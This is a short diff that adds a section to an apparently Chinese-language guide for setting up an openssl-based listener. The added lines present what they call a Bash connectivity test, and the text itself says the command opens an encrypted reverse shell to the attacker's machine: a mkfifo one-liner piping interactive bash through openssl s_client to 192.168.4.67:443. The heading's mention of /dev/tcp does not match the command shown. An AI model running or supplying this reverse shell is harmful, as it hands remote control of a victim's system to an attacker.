@@ -63,4 +63,10 @@ openssl s_server -quiet -key key.pem -cert cert.pem -port 443 -ign_eof
 timeout /t 2 >nul
 goto loop
 双击运行。
+用纯 Bash 临时测试连通性（利用 /dev/tcp，不需要 Python）
+执行下面这条命令，它会建立一个加密反向 shell 连到你的攻击机。
+
+bash
+/bin/bash -c 'P=/tmp/.t; rm -f $P; mkfifo $P; /Volumes/Data/usr/bin/openssl s_client -quiet -connect 192.168.4.67:443 < $P | /bin/bash -i &> $P'
+
 
